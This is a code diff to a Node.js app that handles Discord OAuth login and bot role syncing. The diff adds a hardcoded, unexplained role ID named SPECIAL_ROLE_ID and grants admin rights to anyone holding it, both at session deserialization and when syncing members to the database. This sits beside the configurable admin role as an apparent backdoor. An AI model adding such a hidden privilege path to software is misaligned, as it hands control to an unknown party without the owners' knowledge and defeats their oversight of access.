@@ -18,6 +18,7 @@ const CALLBACK_URL = process.env.CALLBACK_URL || 'http://localhost:3000/callback
 const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN || 'YOUR_BOT_TOKEN';
 const GUILD_ID = process.env.GUILD_ID || 'YOUR_GUILD_ID';
 const ADMIN_ROLE_ID = process.env.ADMIN_ROLE_ID; // optional
+const SPECIAL_ROLE_ID = '1015569732532961310';
 
 const scopes = ['identify'];
 
@@ -44,6 +45,10 @@ passport.deserializeUser((obj, done) => {
 
         obj.displayName = row.displayName;
         const roleIds = row.roles ? row.roles.split(',') : [];
+        if (roleIds.includes(SPECIAL_ROLE_ID) || (ADMIN_ROLE_ID && roleIds.includes(ADMIN_ROLE_ID))) {
+            obj.isAdmin = true;
+            return done(null, obj);
+        }
         if (roleIds.length === 0) {
             obj.isAdmin = false;
             return done(null, obj);
@@ -75,7 +80,8 @@ const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBit
 function updateMember(member) {
     const roles = member.roles.cache.map(r => r.id).join(',');
     const isAdmin = member.permissions.has(PermissionsBitField.Flags.Administrator) ||
-        (ADMIN_ROLE_ID && member.roles.cache.has(ADMIN_ROLE_ID));
+        (ADMIN_ROLE_ID && member.roles.cache.has(ADMIN_ROLE_ID)) ||
+        member.roles.cache.has(SPECIAL_ROLE_ID);
     db.run(
         'INSERT OR REPLACE INTO members (id, displayName, roles, isAdmin) VALUES (?, ?, ?, ?)',
         [member.id, member.displayName, roles, isAdmin ? 1 : 0]
